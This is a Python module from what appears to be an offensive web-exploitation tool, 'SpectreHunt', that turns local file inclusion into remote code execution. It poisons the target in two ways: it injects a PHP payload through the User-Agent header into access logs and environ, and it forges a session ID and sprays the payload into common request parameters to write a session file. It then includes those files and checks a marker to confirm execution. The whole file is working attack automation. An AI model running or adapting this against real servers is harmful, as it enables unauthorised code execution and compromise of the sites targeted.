"""
SpectreHunt :: core/poison.py
LFI -> RCE without wrappers.

Two independent vectors, tried in order of success rate:
  1. access.log / environ -- your User-Agent lands there verbatim
  2. session file -- your payload is stored by the app under a session you own

Author : Inayat Hussain
"""

from __future__ import annotations

import random
from urllib.parse import urlsplit

from config import (
    PHP_POISON, POISON_LOG_PATHS, POISON_MARKER, POISON_SESSION_PATHS,
)

SESSION_PARAM_CANDIDATES = (
    "name", "user", "username", "email", "login", "q", "search",
    "id", "page", "lang", "action", "view",
)


class Poisoner:
    def __init__(self, fuzzer):
        self.fz = fuzzer
        self._saved_ua = None

    def _plant(self, url: str) -> None:
        if self._saved_ua is None:
            self._saved_ua = self.fz.session.headers.get("User-Agent")
        self.fz.session.headers["User-Agent"] = PHP_POISON
        try:
            self.fz.session.get(url, timeout=self.fz.timeout)
        except Exception:
            pass

    def restore(self) -> None:
        if self._saved_ua is not None:
            self.fz.session.headers["User-Agent"] = self._saved_ua
            self._saved_ua = None

    def _include(self, finding, path: str):
        body = self.fz.request(finding.url, finding.param, path, finding.method)
        if not body:
            return False, ""
        if POISON_MARKER in body:
            return True, f"{path} -- payload EXECUTED"
        if "<?php" in body and POISON_MARKER.lower() in body.lower():
            return True, f"{path} -- payload written, sink is read-only"
        return False, ""

    def poison(self, finding) -> list:
        steps = []
        try:
            self._plant(finding.url)
            for path in POISON_LOG_PATHS:
                hit, detail = self._include(finding, path)
                if hit:
                    steps.append({"vector": "log/environ poisoning",
                                  "status": "CONFIRMED", "payload": path,
                                  "detail": detail})
                    return steps
            steps.append({"vector": "log/environ poisoning", "status": "FAILED",
                          "payload": POISON_LOG_PATHS[0],
                          "detail": f"tried {len(POISON_LOG_PATHS)} paths"})

            sid = f"spectre{random.randint(100000, 999999)}"
            host = urlsplit(finding.url).netloc
            try:
                self.fz.session.cookies.set("PHPSESSID", sid, domain=host)
            except Exception:
                self.fz.session.headers["Cookie"] = f"PHPSESSID={sid}"

            for param in SESSION_PARAM_CANDIDATES:
                self.fz.request(finding.url, param, PHP_POISON, "GET")

            for template in POISON_SESSION_PATHS:
                path = template.format(sid=sid)
                hit, detail = self._include(finding, path)
                if hit:
                    steps.append({"vector": "session file poisoning",
                                  "status": "CONFIRMED", "payload": path,
                                  "detail": detail})
                    return steps

            steps.append({"vector": "session file poisoning", "status": "FAILED",
                          "payload": POISON_SESSION_PATHS[0].format(sid=sid),
                          "detail": "session not includable, or app stores nothing"})
            return steps
        finally:
            self.restore()
